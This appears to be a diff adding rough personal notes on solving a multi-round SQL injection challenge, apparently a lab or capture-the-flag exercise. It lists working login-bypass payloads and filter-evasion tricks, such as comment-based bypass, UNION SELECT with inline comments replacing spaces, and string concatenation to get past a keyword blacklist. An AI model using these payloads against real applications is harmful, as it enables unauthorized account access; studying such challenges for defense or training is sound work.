@@ -1,0 +1,27 @@
+# After SQL Injection
+SELECT * FROM users WHERE username=''=admin'' AND password=''=0--+'
+
+# Returns other pw after trying SELECT * FROM users WHERE username='admin%27%20--%20' AND password='=0==+'
+SELECT * FROM users WHERE username='admin%27%20--%20' AND password='=0==+'
+
+
+#Got to round two by doing 
+admin
+'=0--+
+
+
+#Got the trick you find hints for your next sql injection on the filter.php page 
+Round3: or and = like > < --
+admin'; works as good as in round 2
+
+
+Round4
+
+SELECT * FROM users WHERE username='kek'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;
+
+
+Round 5
+
+Round5: or and = like > < -- union admin
+
+SELECT * FROM users WHERE username='adm'||'in';
